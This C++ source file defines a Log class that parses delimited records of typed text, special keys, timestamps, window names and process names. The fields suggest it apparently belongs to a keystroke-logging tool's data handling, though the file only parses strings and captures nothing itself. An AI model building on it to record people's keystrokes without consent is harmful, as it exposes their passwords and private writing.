#include <regex>
#include "Log.hpp"

const std::string Log::delimiterString[] = {"\a",
                                            "id",
                                            "token",
                                            "inputText",
                                            "inputSpecial",
                                            "dateTime",
                                            "windowName",
                                            "processName",
                                            "accountName",
                                            "end"};

Log::Log()
{
}

Log::~Log()
{
}

void Log::insertData(std::vector<std::map<std::string, std::string>> &log,
                const std::string &inputText,
                const std::string &inputSpecial,
                const std::string &dateTime,
                const std::string &windowName,
                const std::string &processName)
{
    log.push_back({{Log::delimiterString[Log::inputTextDeliName], inputText},
                   {Log::delimiterString[Log::inputSpecialDeliName], inputSpecial},
                   {Log::delimiterString[Log::dateTimeDeliName], dateTime},
                   {Log::delimiterString[Log::windowNameDeliName], windowName},
                   {Log::delimiterString[Log::processNameDeliName], processName}});
}

void        Log::setData(const std::string &inputLog)
{
    _data = inputLog;
}

std::vector<std::map<std::string, std::string>>		Log::getData()
{
    std::vector<std::map<std::string, std::string>> log;
    std::regex                                      regex(Log::delimiterString[Log::flagDeliName] + "(.*?)" + Log::delimiterString[Log::flagDeliName]);
    std::smatch                                     matchLog;
    std::string                                     dateTime;
    std::string                                     windowName;
    std::string                                     processName;
    std::string                                     special;
    std::string                                     data;

    data = _data;
    boost::replace_all(data, "\n", "");
    while (std::regex_search (data, matchLog, regex))
    {
        special = matchLog.str();
        boost::replace_all(special, Log::delimiterString[Log::flagDeliName], "");
        if (special.find(Log::delimiterString[Log::dateTimeDeliName]) != std::string::npos)
        {
            boost::replace_all(special, Log::delimiterString[Log::dateTimeDeliName] + ":", "");
            dateTime = special;
            special = "";
        }
        else if (special.find(Log::delimiterString[Log::windowNameDeliName]) != std::string::npos)
        {
            boost::replace_all(special, Log::delimiterString[Log::windowNameDeliName] + ":", "");
            windowName = special;
            special = "";
        }
        else if (special.find(Log::delimiterString[Log::processNameDeliName]) != std::string::npos)
        {
            boost::replace_all(special, Log::delimiterString[Log::processNameDeliName] + ":", "");
            processName = special;
            special = "";
        }
        insertData(log, matchLog.prefix(), special, dateTime, windowName, processName);
        special = "";
        data = matchLog.suffix();
    }
    insertData(log, data, special, dateTime, windowName, processName);
    return (log);
};
